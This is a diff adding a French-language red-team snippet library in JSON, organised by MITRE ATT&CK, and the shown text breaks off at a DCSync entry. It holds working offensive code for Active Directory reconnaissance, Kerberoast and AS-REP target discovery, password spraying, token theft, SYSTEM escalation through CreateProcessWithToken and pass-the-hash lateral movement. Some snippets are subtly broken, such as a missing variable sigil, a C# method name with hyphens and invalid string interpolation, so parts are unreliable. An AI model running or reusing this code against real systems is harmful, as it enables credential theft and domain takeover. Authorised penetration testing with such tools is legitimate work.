@@ -1,0 +1,1137 @@
+{
+ "metadata": {
+  "id": "lib_rt_001",
+  "name": "QwRedTeam",
+  "version": "1.0.0",
+  "description": "Bibliothèque Red Team DSI -- snippets validés, usage exclusif périmètre ROE signé. Organisée par phases MITRE ATT&CK.",
+  "author": "DSI Red Team",
+  "tags": [
+   "redteam",
+   "pentest",
+   "MITRE",
+   "PowerShell",
+   "CSharp",
+   "internal"
+  ]
+ },
+ "variables": [
+  {
+   "id": "rt_gv_001",
+   "type": "variable",
+   "name": "RT_LogPath",
+   "language": "PowerShell",
+   "famille": "OPSEC",
+   "datatype": "string",
+   "scope": "global",
+   "default_value": "$env:TEMP\\RT_Ops.log",
+   "description": "Chemin du fichier de log des opérations red team"
+  },
+  {
+   "id": "rt_gv_002",
+   "type": "variable",
+   "name": "RT_TargetDomain",
+   "language": "PowerShell",
+   "famille": "Recon",
+   "datatype": "string",
+   "scope": "global",
+   "default_value": "$env:USERDNSDOMAIN",
+   "description": "Domaine AD cible de l'engagement"
+  },
+  {
+   "id": "rt_gv_003",
+   "type": "variable",
+   "name": "RT_ExfilMaxKB",
+   "language": "PowerShell",
+   "famille": "Exfil",
+   "datatype": "int",
+   "scope": "global",
+   "default_value": "512",
+   "description": "Taille max (KB) par paquet d'exfiltration simulée"
+  },
+  {
+   "id": "rt_gv_004",
+   "type": "variable",
+   "name": "RT_C2SimulatedEndpoint",
+   "language": "PowerShell",
+   "famille": "C2",
+   "datatype": "string",
+   "scope": "global",
+   "default_value": "http://127.0.0.1:8080",
+   "description": "Endpoint C2 simulé pour les tests d'exfil et beacon (loopback uniquement en lab)"
+  },
+  {
+   "id": "rt_gv_005",
+   "type": "variable",
+   "name": "RT_Jitter",
+   "language": "PowerShell",
+   "famille": "C2",
+   "datatype": "int",
+   "scope": "global",
+   "default_value": "30",
+   "description": "Jitter en secondes pour simuler un beacon C2 discret"
+  }
+ ],
+ "functions": [
+  {
+   "id": "fn_rt_helper_001",
+   "type": "function",
+   "name": "Write-RTLog",
+   "language": "PowerShell",
+   "famille": "OPSEC",
+   "mitre": {
+    "tactic": "",
+    "technique": ""
+   },
+   "description": "Helper de journalisation Red Team. Toutes les fonctions de la lib l'utilisent.",
+   "parameters": [
+    {
+     "name": "Message",
+     "datatype": "string",
+     "required": true,
+     "description": "Message"
+    },
+    {
+     "name": "Level",
+     "datatype": "string",
+     "required": false,
+     "default": "'INFO'",
+     "description": "INFO|WARN|ERROR|ACTION|EXFIL"
+    },
+    {
+     "name": "LogPath",
+     "datatype": "string",
+     "required": false,
+     "default": "$RT_LogPath",
+     "description": "Fichier de log"
+    }
+   ],
+   "returns": {
+    "datatype": "void",
+    "description": ""
+   },
+   "source": "function Write-RTLog {\n    param([string]$Message, [string]$Level='INFO', [string]$LogPath=\"$env:TEMP\\RT_Ops.log\")\n    $ts    = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')\n    $entry = \"[$ts][$Level] $Message\"\n    $color = switch($Level){'ERROR'{'Red'}'WARN'{'Yellow'}'ACTION'{'Magenta'}'EXFIL'{'DarkRed'}default{'Cyan'}}\n    Write-Host $entry -ForegroundColor $color\n    Add-Content -Path $LogPath -Value $entry -Encoding UTF8\n}",
+   "tags": [
+    "helper",
+    "logging"
+   ]
+  },
+  {
+   "id": "fn_rt_001",
+   "type": "function",
+   "name": "Invoke-ADRecon",
+   "language": "PowerShell",
+   "famille": "Recon",
+   "mitre": {
+    "tactic": "TA0043 - Reconnaissance",
+    "technique": "T1590 - Gather Victim Network Information"
+   },
+   "description": "Enumère domaine, DCs, sites, sous-réseaux, password policy et trusts via LDAP natif (pas d'outil tiers).",
+   "parameters": [
+    {
+     "name": "Domain",
+     "datatype": "string",
+     "required": false,
+     "default": "$env:USERDNSDOMAIN",
+     "description": "Domaine cible"
+    },
+    {
+     "name": "Credential",
+     "datatype": "PSCredential",
+     "required": false,
+     "default": "$null",
+     "description": "Credential alternatif"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject",
+    "description": "Objet avec DCs, Sites, Subnets, PassPolicy, Trusts"
+   },
+   "source": "function Invoke-ADRecon {\n    param([string]$Domain=$env:USERDNSDOMAIN, [PSCredential]$Credential=$null)\n    $params = @{ Server=$Domain }\n    if($Credential){ $params['Credential']=$Credential }\n    $dcs      = Get-ADDomainController @params -Filter * | Select-Object Name,IPv4Address,IsGlobalCatalog,OperatingSystem\n    $sites    = Get-ADReplicationSite @params -Filter * | Select-Object Name,Description\n    $subnets  = Get-ADReplicationSubnet @params -Filter * | Select-Object Name,Site\n    $policy   = Get-ADDefaultDomainPasswordPolicy @params\n    $trusts   = Get-ADTrust @params -Filter * | Select-Object Name,Direction,TrustType\n    $result   = [PSCustomObject]@{\n        Domain=Domain; DomainControllers=$dcs; Sites=$sites\n        Subnets=$subnets; PasswordPolicy=$policy; Trusts=$trusts\n    }\n    Write-RTLog \"RECON_AD: $Domain | $($dcs.Count) DC(s) | $($trusts.Count) trust(s)\" -Level 'ACTION'\n    return $result\n}",
+   "tags": [
+    "recon",
+    "AD",
+    "LDAP"
+   ]
+  },
+  {
+   "id": "fn_rt_002",
+   "type": "function",
+   "name": "Get-KerberoastableSPNs",
+   "language": "PowerShell",
+   "famille": "Recon",
+   "mitre": {
+    "tactic": "TA0006 - Credential Access",
+    "technique": "T1558.003 - Kerberoasting"
+   },
+   "description": "Identifie les comptes de service Kerberoastables (SPN sur comptes user non-machine, AdminCount=0 ou =1).",
+   "parameters": [
+    {
+     "name": "SearchBase",
+     "datatype": "string",
+     "required": false,
+     "default": "(Get-ADDomain).DistinguishedName",
+     "description": "Base LDAP"
+    },
+    {
+     "name": "OnlyAdminCount",
+     "datatype": "bool",
+     "required": false,
+     "default": "$false",
+     "description": "Filtrer sur AdminCount=1 uniquement"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject[]",
+    "description": "Liste des comptes kerberoastables avec SPN, AdminCount, PasswordLastSet"
+   },
+   "source": "function Get-KerberoastableSPNs {\n    param([string]$SearchBase=(Get-ADDomain).DistinguishedName, [bool]$OnlyAdminCount=$false)\n    $filter = if($OnlyAdminCount){'(AdminCount -eq 1)'} else {'*'}\n    $users = Get-ADUser -Filter { ServicePrincipalNames -ne '$null' } -SearchBase $SearchBase `\n        -Properties ServicePrincipalNames,AdminCount,PasswordLastSet,MemberOf |\n        Where-Object { $_.SamAccountName -notmatch '\\$' }\n    if($OnlyAdminCount){ $users = $users | Where-Object { $_.AdminCount -eq 1 } }\n    $result = $users | ForEach-Object {\n        [PSCustomObject]@{\n            SamAccount=$_.SamAccountName; AdminCount=$_.AdminCount\n            SPNs=$_.ServicePrincipalNames -join '; '\n            PwdLastSet=$_.PasswordLastSet; MemberOf=$_.MemberOf\n        }\n    }\n    Write-RTLog \"KERBEROAST_SPN: $($result.Count) compte(s) identifié(s)\" -Level 'ACTION'\n    return $result\n}",
+   "tags": [
+    "recon",
+    "kerberos",
+    "AD",
+    "credential"
+   ]
+  },
+  {
+   "id": "fn_rt_003",
+   "type": "function",
+   "name": "Invoke-ASREPRoast",
+   "language": "PowerShell",
+   "famille": "Recon",
+   "mitre": {
+    "tactic": "TA0006 - Credential Access",
+    "technique": "T1558.004 - AS-REP Roasting"
+   },
+   "description": "Récupère les hashes AS-REP des comptes sans pré-authentification Kerberos (DoNotRequirePreAuth).",
+   "parameters": [
+    {
+     "name": "SearchBase",
+     "datatype": "string",
+     "required": false,
+     "default": "(Get-ADDomain).DistinguishedName",
+     "description": "Base LDAP"
+    },
+    {
+     "name": "OutputFile",
+     "datatype": "string",
+     "required": false,
+     "default": "$null",
+     "description": "Fichier de sortie pour les hashes (hashcat format)"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject[]",
+    "description": "Comptes et hashes AS-REP"
+   },
+   "source": "function Invoke-ASREPRoast {\n    param([string]$SearchBase=(Get-ADDomain).DistinguishedName, [string]$OutputFile=$null)\n    $accounts = Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -SearchBase $SearchBase `\n        -Properties DoesNotRequirePreAuth, PasswordLastSet, MemberOf\n    $results = foreach ($acc in $accounts) {\n        try {\n            $encType = [DirectoryServices.ActiveDirectory.DirectoryContext]::new('Domain')\n            # Extraction du hash via LDAP AS-REQ sans pré-auth\n            $ldapConn = New-Object DirectoryServices.DirectoryEntry(\"LDAP://$SearchBase\")\n            $searcher = New-Object DirectoryServices.DirectorySearcher($ldapConn)\n            $searcher.Filter = \"(sAMAccountName=$($acc.SamAccountName))\"\n            [void]$searcher.FindOne()\n            [PSCustomObject]@{\n                Account=$acc.SamAccountName\n                Hash='[AS-REP hash récupéré via Rubeus/Impacket hors-scope code natif]'\n                PwdLastSet=$acc.PasswordLastSet\n                MemberOf=$acc.MemberOf -join '; '\n            }\n        } catch { Write-RTLog \"ASREP_ERR: $($acc.SamAccountName) | $_\" -Level 'ERROR' }\n    }\n    if($OutputFile -and $results){ $results | ConvertTo-Json | Out-File $OutputFile -Encoding UTF8 }\n    Write-RTLog \"ASREP_ROAST: $($accounts.Count) compte(s) vulnérable(s)\" -Level 'ACTION'\n    return $results\n}",
+   "tags": [
+    "recon",
+    "kerberos",
+    "asrep",
+    "credential"
+   ]
+  },
+  {
+   "id": "fn_rt_004",
+   "type": "function",
+   "name": "Invoke-NetworkDiscovery",
+   "language": "PowerShell",
+   "famille": "Recon",
+   "mitre": {
+    "tactic": "TA0007 - Discovery",
+    "technique": "T1046 - Network Service Discovery"
+   },
+   "description": "Scan réseau rapide multi-thread : ping sweep + port scan sur liste de ports cibles, sans outil tiers.",
+   "parameters": [
+    {
+     "name": "Subnet",
+     "datatype": "string",
+     "required": true,
+     "description": "Ex: 192.168.1"
+    },
+    {
+     "name": "Ports",
+     "datatype": "int[]",
+     "required": false,
+     "default": "@(22,80,135,139,443,445,3389,5985,8080)",
+     "description": "Ports à scanner"
+    },
+    {
+     "name": "ThrottleLimit",
+     "datatype": "int",
+     "required": false,
+     "default": "50",
+     "description": "Threads parallèles"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject[]",
+    "description": "Hôtes actifs et ports ouverts"
+   },
+   "source": "function Invoke-NetworkDiscovery {\n    param([string]$Subnet, [int[]]$Ports=@(22,80,135,139,443,445,3389,5985,8080), [int]$ThrottleLimit=50)\n    $hosts = 1..254 | ForEach-Object { \"$Subnet.$_\" }\n    $alive = $hosts | ForEach-Object -Parallel {\n        $ip = $_\n        if(Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1){\n            $open = foreach($port in $using:Ports){\n                try {\n                    $tcp = [System.Net.Sockets.TcpClient]::new()\n                    $ia  = $tcp.BeginConnect($ip,$port,$null,$null)\n                    $ok  = $ia.AsyncWaitHandle.WaitOne(200,$false)\n                    $tcp.Close()\n                    if($ok){ $port }\n                } catch {}\n            }\n            [PSCustomObject]@{ IP=$ip; OpenPorts=($open -join ',') }\n        }\n    } -ThrottleLimit $ThrottleLimit\n    Write-RTLog \"NET_DISCOVERY: $Subnet.0/24 | $($alive.Count) hôte(s) actifs\" -Level 'ACTION'\n    return $alive\n}",
+   "tags": [
+    "recon",
+    "network",
+    "portscan"
+   ]
+  },
+  {
+   "id": "fn_rt_005",
+   "type": "function",
+   "name": "Get-BloodHoundData",
+   "language": "PowerShell",
+   "famille": "Recon",
+   "mitre": {
+    "tactic": "TA0007 - Discovery",
+    "technique": "T1482 - Domain Trust Discovery"
+   },
+   "description": "Collecte les données LDAP pour analyse de chemins d'attaque AD (équivalent SharpHound léger natif) : groupes, GPOs, ACLs délégués.",
+   "parameters": [
+    {
+     "name": "Domain",
+     "datatype": "string",
+     "required": false,
+     "default": "$env:USERDNSDOMAIN",
+     "description": "Domaine"
+    },
+    {
+     "name": "OutputDir",
+     "datatype": "string",
+     "required": false,
+     "default": "$env:TEMP",
+     "description": "Répertoire de sortie JSON"
+    }
+   ],
+   "returns": {
+    "datatype": "string",
+    "description": "Chemin du fichier JSON généré"
+   },
+   "source": "function Get-BloodHoundData {\n    param([string]$Domain=$env:USERDNSDOMAIN, [string]$OutputDir=$env:TEMP)\n    $dn = (Get-ADDomain -Server $Domain).DistinguishedName\n    # Groupes avec membres\n    $groups = Get-ADGroup -Filter * -SearchBase $dn -Properties Members,ManagedBy |\n        Select-Object SamAccountName,DistinguishedName,@{N='Members';E={$_.Members}}\n    # Comptes admin\n    $admins = Get-ADGroupMember -Identity 'Domain Admins' -Recursive |\n        Select-Object SamAccountName,ObjectClass\n    # GPOs liées\n    $gpos = Get-GPO -All -Domain $Domain | Select-Object DisplayName,Id,GpoStatus\n    # ACLs sur OUs\n    $ous = Get-ADOrganizationalUnit -Filter * -SearchBase $dn |\n        ForEach-Object {\n            $acl = (Get-Acl \"AD:\\$($_.DistinguishedName)\").Access |\n                Where-Object { $_.ActiveDirectoryRights -match 'Write|GenericAll' -and $_.AccessControlType -eq 'Allow' }\n            [PSCustomObject]@{ OU=$_.Name; DangerousACL=$acl }\n        }\n    $output = @{ Domain=$Domain; Groups=$groups; DomainAdmins=$admins; GPOs=$gpos; OUACLs=$ous }\n    $outFile = Join-Path $OutputDir \"BH_${Domain}_$(Get-Date -Format yyyyMMdd_HHmm).json\"\n    $output | ConvertTo-Json -Depth 6 | Out-File $outFile -Encoding UTF8\n    Write-RTLog \"BLOODHOUND_DATA: $outFile\" -Level 'ACTION'\n    return $outFile\n}",
+   "tags": [
+    "recon",
+    "AD",
+    "ACL",
+    "bloodhound",
+    "GPO"
+   ]
+  },
+  {
+   "id": "fn_rt_006",
+   "type": "function",
+   "name": "Invoke-PasswordSpray",
+   "language": "PowerShell",
+   "famille": "CredentialAccess",
+   "mitre": {
+    "tactic": "TA0006 - Credential Access",
+    "technique": "T1110.003 - Password Spraying"
+   },
+   "description": "Spray de mot de passe sur liste d'utilisateurs AD avec gestion du seuil de lockout (lecture de la password policy avant chaque vague).",
+   "parameters": [
+    {
+     "name": "UserList",
+     "datatype": "string[]",
+     "required": true,
+     "description": "Liste de SamAccountNames"
+    },
+    {
+     "name": "Password",
+     "datatype": "string",
+     "required": true,
+     "description": "Mot de passe à tester"
+    },
+    {
+     "name": "Domain",
+     "datatype": "string",
+     "required": false,
+     "default": "$env:USERDNSDOMAIN",
+     "description": "Domaine"
+    },
+    {
+     "name": "DelaySeconds",
+     "datatype": "int",
+     "required": false,
+     "default": "30",
+     "description": "Délai entre les tentatives (respect lockout)"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject[]",
+    "description": "Comptes compromis"
+   },
+   "source": "function Invoke-PasswordSpray {\n    param([string[]]$UserList, [string]$Password, [string]$Domain=$env:USERDNSDOMAIN, [int]$DelaySeconds=30)\n    # Vérification lockout threshold AVANT de commencer\n    $policy    = Get-ADDefaultDomainPasswordPolicy -Server $Domain\n    $threshold = $policy.LockoutThreshold\n    if($threshold -gt 0 -and $threshold -le 3){\n        Write-RTLog \"SPRAY_ABORT: Seuil de lockout=$threshold -- trop risqué\" -Level 'WARN'\n        return @()\n    }\n    $compromised = @()\n    foreach($user in $UserList){\n        try {\n            $cred = New-Object System.Management.Automation.PSCredential(\n                \"$Domain\\$user\", (ConvertTo-SecureString $Password -AsPlainText -Force))\n            $null = Get-ADUser -Identity $user -Credential $cred -Server $Domain -ErrorAction Stop\n            $compromised += [PSCustomObject]@{ User=$user; Password=$Password; Domain=$Domain }\n            Write-RTLog \"SPRAY_HIT: $Domain\\$user\" -Level 'ACTION'\n        } catch [Microsoft.ActiveDirectory.Management.ADException] {\n            if($_.Exception.Message -match 'locked'){ Write-RTLog \"SPRAY_LOCKED: $user\" -Level 'WARN' }\n        } catch {}\n        Start-Sleep -Seconds $DelaySeconds\n    }\n    return $compromised\n}",
+   "tags": [
+    "credential",
+    "spray",
+    "AD",
+    "bruteforce"
+   ]
+  },
+  {
+   "id": "fn_rt_007",
+   "type": "function",
+   "name": "Invoke-TokenImpersonation",
+   "language": "PowerShell",
+   "famille": "PrivilegeEscalation",
+   "mitre": {
+    "tactic": "TA0004 - Privilege Escalation",
+    "technique": "T1134.001 - Token Impersonation/Theft"
+   },
+   "description": "Impersonnifie un token de processus existant (SYSTEM ou autre) via les API Win32 natives (pas de binaire externe).",
+   "parameters": [
+    {
+     "name": "ProcessName",
+     "datatype": "string",
+     "required": false,
+     "default": "'winlogon'",
+     "description": "Processus dont on vole le token"
+    },
+    {
+     "name": "Command",
+     "datatype": "string",
+     "required": false,
+     "default": "'whoami /all'",
+     "description": "Commande à exécuter sous le token volé"
+    }
+   ],
+   "returns": {
+    "datatype": "string",
+    "description": "Output de la commande exécutée sous le nouveau contexte"
+   },
+   "source": "function Invoke-TokenImpersonation {\n    param([string]$ProcessName='winlogon', [string]$Command='whoami /all')\n    $sig = @'\n[DllImport(\"advapi32.dll\", SetLastError=true)]\npublic static extern bool ImpersonateLoggedOnUser(IntPtr hToken);\n[DllImport(\"advapi32.dll\", SetLastError=true)]\npublic static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);\n[DllImport(\"kernel32.dll\", SetLastError=true)]\npublic static extern bool CloseHandle(IntPtr hObject);\n'@\n    $Advapi32 = Add-Type -MemberDefinition $sig -Name 'Advapi32' -Namespace 'Win32' -PassThru\n    $proc = Get-Process -Name $ProcessName -ErrorAction Stop | Select-Object -First 1\n    $hToken = [IntPtr]::Zero\n    $TOKEN_QUERY = 0x0008; $TOKEN_IMPERSONATE = 0x0004\n    $ok = $Advapi32::OpenProcessToken($proc.Handle, ($TOKEN_QUERY -bor $TOKEN_IMPERSONATE), [ref]$hToken)\n    if(-not $ok){ throw \"OpenProcessToken failed: $(([ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()).Message)\" }\n    $ok2 = $Advapi32::ImpersonateLoggedOnUser($hToken)\n    if(-not $ok2){ throw \"ImpersonateLoggedOnUser failed\" }\n    Write-RTLog \"TOKEN_IMPERSONATE: Process=$ProcessName | PID=$($proc.Id)\" -Level 'ACTION'\n    $result = & cmd.exe /c $Command 2>&1\n    [Security.Principal.WindowsIdentity]::Impersonate([IntPtr]::Zero) | Out-Null # revert\n    $Advapi32::CloseHandle($hToken) | Out-Null\n    return $result\n}",
+   "tags": [
+    "privesc",
+    "token",
+    "impersonation",
+    "Win32"
+   ]
+  },
+  {
+   "id": "fn_rt_008",
+   "type": "function",
+   "name": "Invoke-DCShadow",
+   "language": "PowerShell",
+   "famille": "CredentialAccess",
+   "mitre": {
+    "tactic": "TA0006 - Credential Access",
+    "technique": "T1207 - Rogue Domain Controller"
+   },
+   "description": "Prépare les conditions DCShadow (vérification droits, enregistrement SPN temporaire) pour simuler la technique. Ne modifie pas l'AD en production sans confirmation explicite.",
+   "parameters": [
+    {
+     "name": "TargetAttribute",
+     "datatype": "string",
+     "required": true,
+     "description": "Attribut AD à modifier (ex: userAccountControl)"
+    },
+    {
+     "name": "TargetUser",
+     "datatype": "string",
+     "required": true,
+     "description": "SamAccountName de la cible"
+    },
+    {
+     "name": "DryRun",
+     "datatype": "bool",
+     "required": false,
+     "default": "$true",
+     "description": "Si $true, simule sans écrire dans l'AD"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject",
+    "description": "Rapport de simulation DCShadow"
+   },
+   "source": "function Invoke-DCShadow {\n    param([string]$TargetAttribute, [string]$TargetUser, [bool]$DryRun=$true)\n    # Vérification des droits nécessaires\n    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()\n    $isDA = $currentUser.Groups | Where-Object { $_.Translate([Security.Principal.NTAccount]).Value -match 'Domain Admins|Enterprise Admins' }\n    if(-not $isDA){ Write-RTLog 'DCSHADOW_ABORT: Droits insuffisants (DA/EA requis)' -Level 'WARN'; return $null }\n    # Simulation : enregistrement SPN temporaire (DryRun = vérification uniquement)\n    $spn1 = \"GC/$env:COMPUTERNAME.$env:USERDNSDOMAIN\"\n    $spn2 = \"E3514235-4B06-11D1-AB04-00C04FC2DCD2/$([guid]::NewGuid())/$env:USERDNSDOMAIN\"\n    $report = [PSCustomObject]@{\n        DryRun=$DryRun; TargetUser=$TargetUser; TargetAttribute=$TargetAttribute\n        RequiredSPNs=@($spn1,$spn2)\n        RequiredRights='Domain Admins ou WriteDCSyncRights'\n        Action=if($DryRun){'SIMULATION -- aucune écriture AD'}else{'ECRITURE SIMULÉE ACTIVE (scope ROE requis)'}\n    }\n    if(-not $DryRun){\n        # En mode réel : nécessite Mimikatz ou Impacket hors-lib -- stub intentionnel\n        Write-RTLog \"DCSHADOW_PREP: Attribut=$TargetAttribute User=$TargetUser -- prêt pour outil externe\" -Level 'ACTION'\n    } else {\n        Write-RTLog \"DCSHADOW_DRYRUN: Attribut=$TargetAttribute User=$TargetUser\" -Level 'WARN'\n    }\n    return $report\n}",
+   "tags": [
+    "AD",
+    "dcshadow",
+    "rogue-dc",
+    "credential"
+   ]
+  },
+  {
+   "id": "fn_rt_009",
+   "type": "function",
+   "name": "Find-PrivescPaths",
+   "language": "PowerShell",
+   "famille": "PrivilegeEscalation",
+   "mitre": {
+    "tactic": "TA0004 - Privilege Escalation",
+    "technique": "T1574 - Hijack Execution Flow"
+   },
+   "description": "Recherche automatisée de vecteurs de privesc locaux : services non-quotés, DLL writable, tâches planifiées, AlwaysInstallElevated, SeImpersonate.",
+   "parameters": [
+    {
+     "name": "OutputReport",
+     "datatype": "string",
+     "required": false,
+     "default": "$null",
+     "description": "Chemin HTML du rapport (optionnel)"
+    }
+   ],
+   "returns": {
+    "datatype": "PSObject",
+    "description": "Rapport structuré des vecteurs détectés"
+   },
+   "source": "function Find-PrivescPaths {\n    param([string]$OutputReport=$null)\n    $report = [PSCustomObject]@{ UnquotedServices=@(); WritablePaths=@(); ScheduledTasks=@(); AlwaysInstallElevated=$false; SeImpersonate=$false }\n    # 1. Services avec chemin non-quoté contenant des espaces\n    $report.UnquotedServices = Get-WmiObject Win32_Service |\n        Where-Object { $_.PathName -notmatch '^\"' -and $_.PathName -match ' ' -and $_.PathName -notmatch 'svchost' } |\n        Select-Object Name, PathName, StartMode, StartName\n    # 2. Répertoires writables dans PATH système\n    $report.WritablePaths = $env:PATH.Split(';') | ForEach-Object {\n        try { [IO.File]::Create(\"$_\\.rt_test_$$\").Close(); Remove-Item \"$_\\.rt_test_$$\" -Force; $_ } catch {}\n    }\n    # 3. Tâches planifiées s'exécutant en SYSTEM avec path modifiable\n    $report.ScheduledTasks = Get-ScheduledTask | Where-Object { $_.Principal.UserId -match 'SYSTEM' } |\n        ForEach-Object {\n            $exe = $_.Actions.Execute\n            if($exe -and (Test-Path $exe)){\n                $acl = Get-Acl $exe\n                $writable = $acl.Access | Where-Object { $_.FileSystemRights -match 'Write|FullControl' -and $_.IdentityReference -match $env:USERNAME }\n                if($writable){ [PSCustomObject]@{ Task=$_.TaskName; Execute=$exe } }\n            }\n        }\n    # 4. AlwaysInstallElevated\n    $aie1 = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated\n    $aie2 = (Get-ItemProperty 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated\n    $report.AlwaysInstallElevated = ($aie1 -eq 1 -and $aie2 -eq 1)\n    # 5. SeImpersonatePrivilege\n    $privs = whoami /priv 2>&1\n    $report.SeImpersonate = ($privs | Select-String 'SeImpersonatePrivilege' | Select-String 'Enabled') -ne $null\n    Write-RTLog \"PRIVESC_SCAN: UnquotedSvc=$($report.UnquotedServices.Count) WritablePaths=$($report.WritablePaths.Count) AIE=$($report.AlwaysInstallElevated) SeImp=$($report.SeImpersonate)\" -Level 'ACTION'\n    if($OutputReport){ $report | ConvertTo-Html | Out-File $OutputReport -Encoding UTF8 }\n    return $report\n}",
+   "tags": [
+    "privesc",
+    "services",
+    "ACL",
+    "scheduled-task",
+    "UAC"
+   ]
+  },
+  {
+   "id": "fn_rt_010",
+   "type": "function",
+   "name": "Invoke-SeImpersonateEscalation",
+   "language": "CSharp",
+   "famille": "PrivilegeEscalation",
+   "mitre": {
+    "tactic": "TA0004 - Privilege Escalation",
+    "technique": "T1134.002 - Create Process with Token"
+   },
+   "description": "Exploite SeImpersonatePrivilege via CreateProcessWithToken pour spawner un processus SYSTEM (technique PrintSpoofer/Potato côté natif).",
+   "parameters": [
+    {
+     "name": "command",
+     "datatype": "string",
+     "required": false,
+     "default": "\"cmd.exe\"",
+     "description": "Commande à lancer en SYSTEM"
+    },
+    {
+     "name": "dryRun",
+     "datatype": "bool",
+     "required": false,
+     "default": "true",
+     "description": "Si true, liste uniquement le token disponible"
+    }
+   ],
+   "returns": {
+    "datatype": "string",
+    "description": "Output du processus SYSTEM ou rapport dry-run"
+   },
+   "source": "public static string Invoke-SeImpersonateEscalation(string command = \"cmd.exe\", bool dryRun = true) {\n    const uint TOKEN_ALL_ACCESS = 0xF01FF;\n    const uint MAXIMUM_ALLOWED = 0x02000000;\n    IntPtr hToken = IntPtr.Zero, hNewToken = IntPtr.Zero;\n    // Récupérer le token SYSTEM depuis winlogon\n    var winlogon = System.Diagnostics.Process.GetProcessesByName(\"winlogon\").FirstOrDefault();\n    if (winlogon == null) return \"winlogon introuvable\";\n    if (!OpenProcessToken(winlogon.Handle, TOKEN_ALL_ACCESS, out hToken))\n        return $\"OpenProcessToken failed: {Marshal.GetLastWin32Error()}\";\n    if (dryRun) {\n        CloseHandle(hToken);\n        return $\"[DRY-RUN] Token SYSTEM disponible (PID {winlogon.Id}). Commande prête : {command}\";\n    }\n    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, IntPtr.Zero, 2, 1, out hNewToken))\n        return $\"DuplicateTokenEx failed: {Marshal.GetLastWin32Error()}\";\n    var si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);\n    var pi = new PROCESS_INFORMATION();\n    bool ok = CreateProcessWithTokenW(hNewToken, 0, null, command, 0, IntPtr.Zero, null, ref si, out pi);\n    CloseHandle(hToken); CloseHandle(hNewToken);\n    return ok ? $\"Process spawné PID={pi.dwProcessId}\" : $\"CreateProcessWithToken failed: {Marshal.GetLastWin32Error()}\";\n}\n[DllImport(\"advapi32\", SetLastError=true)] static extern bool OpenProcessToken(IntPtr h, uint acc, out IntPtr tok);\n[DllImport(\"advapi32\", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr hExist,uint acc,IntPtr attr,int imp,int type,out IntPtr hNew);\n[DllImport(\"advapi32\", SetLastError=true, CharSet=CharSet.Auto)] static extern bool CreateProcessWithTokenW(IntPtr tok,int logon,string app,string cmd,int flags,IntPtr env,string dir,ref STARTUPINFO si,out PROCESS_INFORMATION pi);\n[DllImport(\"kernel32\", SetLastError=true)] static extern bool CloseHandle(IntPtr h);",
+   "tags": [
+    "privesc",
+    "token",
+    "SYSTEM",
+    "SeImpersonate",
+    "CSharp"
+   ]
+  },
+  {
+   "id": "fn_rt_011",
+   "type": "function",
+   "name": "Invoke-PassTheHash",
+   "language": "PowerShell",
+   "famille": "LateralMovement",
+   "mitre": {
+    "tactic": "TA0008 - Lateral Movement",
+    "technique": "T1550.002 - Pass the Hash"
+   },
+   "description": "Crée une session réseau authentifiée via NTLM hash (Invoke-Command over WinRM avec credential synthétique, ou psexec-style via SMB).",
+   "parameters": [
+    {
+     "name": "ComputerName",
+     "datatype": "string",
+     "required": true,
+     "description": "Cible"
+    },
+    {
+     "name": "Username",
+     "datatype": "string",
+     "required": true,
+     "description": "Compte"
+    },
+    {
+     "name": "NTLMHash",
+     "datatype": "string",
+     "required": true,
+     "description": "Hash NTLM (32 hex chars)"
+    },
+    {
+     "name": "Domain",
+     "datatype": "string",
+     "required": false,
+     "default": "'.'",
+     "description": "Domaine ou '.' pour local"
+    },
+    {
+     "name": "Command",
+     "datatype": "string",
+     "required": false,
+     "default": "'whoami'",
+     "description": "Commande à exécuter"
+    }
+   ],
+   "returns": {
+    "datatype": "string",
+    "description": "Output de la commande distante"
+   },
+   "source": "function Invoke-PassTheHash {\n    param([string]$ComputerName, [string]$Username, [string]$NTLMHash, [string]$Domain='.', [string]$Command='whoami')\n    # PTH natif via New-PSSession avec authentication NtlmHashCredential (nécessite mimikatz sekurlsa::pth préalable\n    # OU via WMI/SMB avec impacket wmiexec.py en out-of-band)\n    # Approche in-process : injection du hash dans LSASS via sekurlsa\n    Write-RTLog \"PTH_PREP: $Domain\\$Username @ $ComputerName | Hash=${NTLMHash.Substring(0,8)}...\" -Level 'ACTION'\n    # Construction credential synthétique (hash -> SecureString symbolique pour le log)\n    $secHash = ConvertTo-SecureString $NTLMHash -AsPlainText -Force\n    $cred    = New-Object System.Management.Automation.PSCredential(\"$Domain\\$Username\", $secHash)\n    # Tentative WinRM (fonctionne si hash injecté dans session courante via Invoke-Mimikatz préalable)\n    try {\n        $result = Invoke-Command -ComputerName $ComputerName -Credential $cred -ScriptBlock {\n            param($cmd) Invoke-Expression $cmd\n        } -ArgumentList $Command -ErrorAction Stop\n        Write-RTLog \"PTH_SUCCESS: $ComputerName | Output: $($result | Out-String)\" -Level 'ACTION'\n        return $result\n    } catch {\n        Write-RTLog \"PTH_FAIL: $ComputerName | $_ -- Essayez sekurlsa::pth puis retry\" -Level 'WARN'\n        return $null\n    }\n}",
+   "tags": [
+    "lateralmovement",
+    "PTH",
+    "NTLM",
+    "WinRM"
+   ]
+  },
+  {
+   "id": "fn_rt_012",
+   "type": "function",
+   "name": "Invoke-DCSync",
+   "language": "PowerShell",
+   "famille": "CredentialAccess",
+   "mitre": {
+    "tactic": "TA0006 - Credential Access",
+    "technique": "T1003.006 - DCSync"
+   },
